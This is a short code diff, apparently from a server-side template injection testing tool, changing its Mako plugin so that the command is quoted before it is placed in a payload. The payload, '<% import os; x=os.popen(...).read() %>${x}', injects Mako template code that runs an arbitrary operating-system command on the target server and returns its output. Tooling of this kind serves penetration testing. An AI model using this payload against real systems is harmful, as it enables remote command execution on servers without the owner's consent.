@@ -1,6 +1,7 @@
 from core.check import Check
 from utils.loggers import log
 from utils import rand
+from utils.strings import quote
 import string
 
 class Mako(Check):
@@ -43,5 +44,4 @@ class Mako(Check):
 
     def execute(self, command):
 
-        # TODO: quote command
-        return self.inject("""<%% import os; x=os.popen('%s').read() %%>${x}""" % (command))
+        return self.inject("""<%% import os; x=os.popen("%s").read() %%>${x}""" % (quote(command)))
